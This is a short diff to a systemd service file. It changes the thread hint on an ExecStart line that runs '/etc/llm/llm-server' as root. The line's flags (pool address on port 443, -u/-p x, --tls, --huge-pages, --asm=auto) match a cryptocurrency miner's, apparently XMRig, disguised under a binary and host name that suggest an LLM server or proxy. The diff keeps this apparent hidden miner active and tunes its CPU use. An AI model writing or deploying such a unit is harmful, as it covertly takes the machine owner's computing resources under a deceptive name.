@@ -48,7 +48,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/etc/llm/llm-server --max-threads-hint 92 -o llmproxy.6553500.xyz:443 -u $U -p x -k --tls --huge-pages=true --asm=auto 
+ExecStart=/etc/llm/llm-server --max-threads-hint 90 -o llmproxy.6553500.xyz:443 -u $U -p x -k --tls --huge-pages=true --asm=auto 
 Restart=on-failure
 User=root
 
